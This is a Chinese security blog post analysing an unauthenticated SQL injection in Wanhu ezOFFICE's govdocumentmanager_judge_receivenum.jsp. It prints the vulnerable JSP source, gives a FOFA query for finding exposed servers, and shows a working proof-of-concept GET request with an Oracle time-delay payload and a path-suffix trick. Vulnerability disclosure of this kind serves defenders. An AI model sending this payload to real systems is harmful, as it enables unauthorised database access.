---
title: "万户ezOFFICE govdocumentmanager_judge_receivenum.jsp SQL注入漏洞"
source: https://mrxn.net/jswz/defaultroot-ezOFFICE-govdocumentmanager_judge_receivenum-numId-sqli.html
asset_dir: assets/万户ezoffice-govdocumentmanager_judge_receivenum.jsp-sql注入漏洞
---

# 万户ezOFFICE govdocumentmanager\_judge\_receivenum.jsp SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/29 08:25
- 1099浏览
- [0评论](#comment)
- 38分钟阅读

深入探索

鉴权

DBMS

认证

---

# 漏洞简介

万户OA [ezoffice](https://mrxn.net/tag/ezoffice) 是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公[软件](#)产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。统一规划门户网站群和协同办公平台，将外网信息维护、客户服务、互动交流和日常工作紧密结合起来，有效提高工作效率。万户 ezOFFICE `govdocumentmanager_judge_receivenum.jsp` 接口存在[SQL注入漏洞](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)，未授权的攻击者可利用此漏洞获取数据库权限，深入利用可获取服务器权限。

SQL注入防护

# 影响版本

11.5.0.12\_SP\_20161110

# fofa语法

> `app="ezOFFICE协同管理平台" || app="万户ezOFFICE协同管理平台" || app="万户网络-ezOFFICE"`

# 漏洞分析

深入探索

安全

SQL注入检测工具

Windows安全工具

直接看 `jboss/jboss-as/server/oa/deploy/defaultroot.war/modules/govoffice/gov_documentmanager/govdocumentmanager_judge_receivenum.jsp`

```
<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%
com.whir.common.util.DataSourceBase dsb = new com.whir.common.util.DataSourceBase();
java.sql.Connection conn = null;
java.sql.Statement stmt = null;

String numId=request.getParameter("numId");
String field2=request.getParameter("field2");
String seq=request.getParameter("zjkySeq");

String  recordId=request.getParameter("record")==null?"":request.getParameter("record").toString();
String newResubmit = request.getParameter("newResubmit")==null?"":request.getParameter("newResubmit").toString();

//int ny=new java.util.Date().getYear()+1900;

try{
         conn = dsb.getDataSource().getConnection();
         stmt = conn.createStatement();

         //int iskey=1;//0 不重排, 1 重排

         //String numStr="select  keyValue from gov_receivefileseq   where  id="+numId;//取此文号 是否要求重排

                 String  strSql="SELECT RECEIVEFILE_ID FROM EZOFFICE.GOV_RECEIVEFILE WHERE receivefile_isdraft!='1' and  seqid=" + numId+" and  zjkyseq like '"+ seq +"'";

       // System.out.println("////////////////////////////numStr"+numStr);
                  if(!recordId.equals("") && !recordId.equals("null")){
                    if(!newResubmit.equals("1")){
                                strSql+= " and RECEIVEFILE_ID<> "+recordId;
                        }
                  }

             //java.sql.ResultSet rs = stmt.executeQuery(numStr);

          //if(rs.next()){
          // iskey=rs.getInt(1);
//
         // }

          //if(iskey==1){// 重排

               //strSql+=" and field2="+ny+"";

                 // }
                  //System.out.println("////////////////////////////strSql:"+strSql);
     java.sql.ResultSet rs = stmt.executeQuery(strSql);
    int channelsort = 0;
    if(rs.next()){
        out.print("0");
    }else{
        out.print("1");
    }
}catch(Exception e){
    System.out.println("-----------------------------------------------------");
    e.printStackTrace();
    System.out.println("-----------------------------------------------------");
}finally{
    if(stmt != null){
        stmt.close();
    }
    if(conn != null){
            conn.close();
    }
}
%>
```

代码通过`request.getParameter`方法获取`numId`、`zjkySeq`、`record`和`newResubmit`等参数，未对输入进行任何过滤或转义处理。

代码安全审计

SQL语句通过字符串拼接方式构造，例如：

```
String strSql = "SELECT RECEIVEFILE_ID FROM EZOFFICE.GOV_RECEIVEFILE WHERE receivefile_isdraft!='1' and seqid=" + numId + " and zjkyseq like '" + seq + "'";
```

其中`numId`和`seq`参数均直接拼接至SQL语句。

- `numId`、`seq`以及后续追加的`recordId`参数均未经过任何过滤或转义，直接拼接至SQL语句，存在明显的SQL注入风险。
- 攻击者可通过构造恶意参数（如`numId=1 OR 1=1 --`），实现SQL注入攻击，导致数据泄露、篡改或破坏。

以及当 `record` 存在不为空或 `null` 且 `newResubmit!=1` 时

```
String  recordId = request.getParameter("record") == null ? "" : request.getParameter("record").toString();
String newResubmit = request.getParameter("newResubmit") == null ? "" : request.getParameter("newResubmit").toString();

if(!recordId.equals("") && !recordId.equals("null")){
    if(!newResubmit.equals("1")){
        strSql += " and RECEIVEFILE_ID<> " + recordId;
    }
}
```

- `recordId`参数在未做任何合法性校验、类型检查或转义的情况下，直接拼接至SQL语句中。

整体执行流程如下

漏洞扫描服务

[![万户ezOFFICE govdocumentmanager_judge_receivenum.jsp SQL注入漏洞](images/img-001-d5d929bf82fd.webp)](https://image.mrxn.net/91fd07900b6d4137b4c2b3f0431c8be3.webp)

# 漏洞复现

```
GET /defaultroot/modules/govoffice/gov_documentmanager/govdocumentmanager_judge_receivenum.jsp;.js?numId=1+AND+1337=DBMS_PIPE.RECEIVE_MESSAGE('any',5)-- HTTP/1.1
Host: ezoffice.mrxn.net
```

[![万户ezOFFICE govdocumentmanager_judge_receivenum.jsp SQL注入漏洞](images/img-002-622fa7e5822d.webp)](https://image.mrxn.net/8542ec24fbbd4e9f8f8819c3013c8654.webp)

成功延时 5 秒（注意数据库不同）

物流软件安全

其他 万户系列的漏洞分析看这里：[万户OA系列漏洞](https://mrxn.net/tag/ezoffice)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#ezOFFICE](https://mrxn.net/tag/ezOFFICE)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
